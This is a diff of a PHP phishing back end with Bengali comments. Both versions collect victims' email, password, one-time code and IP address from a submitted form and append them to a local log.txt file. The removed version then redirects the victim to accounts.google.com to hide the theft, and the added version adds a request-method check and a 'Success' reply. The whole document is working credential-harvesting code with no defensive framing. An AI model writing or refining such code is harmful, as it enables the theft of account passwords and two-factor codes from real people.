@@ -1,19 +1,21 @@
 <?php
-header('Location: https://accounts.google.com'); // সাবমিট করার পর অরিজিনাল সাইটে পাঠিয়ে দেবে
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $email = $_POST['email'] ?? 'N/A';
+    $password = $_POST['password'] ?? 'N/A';
+    $otp = $_POST['otp'] ?? 'N/A';
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $time = date("Y-m-d H:i:s");
 
-$email = $_POST['email'];
-$pass = $_POST['password'];
-$otp = $_POST['otp'];
-$ip = $_SERVER['REMOTE_ADDR'];
-$time = date('Y-m-d H:i:s');
+    $data = "Time: $time | IP: $ip\nUser: $email | Pass: $password | OTP: $otp\n---\n";
 
-$data = "--- New Entry ($time) ---\n";
-$data .= "Email: $email\n";
-$data .= "Pass: $pass\n";
-$data .= "OTP: $otp\n";
-$data .= "IP: $ip\n";
-$data .= "--------------------------\n\n";
-
-file_put_contents('log.txt', $data, FILE_APPEND);
-exit();
+    // 'a' মোডে ফাইল ওপেন করলে ফাইল না থাকলেও তা তৈরি হয়ে যায়
+    $file = fopen("log.txt", "a");
+    if ($file) {
+        fwrite($file, $data);
+        fclose($file);
+        echo "Success";
+    } else {
+        echo "Error: Manual creation required.";
+    }
+}
 ?>
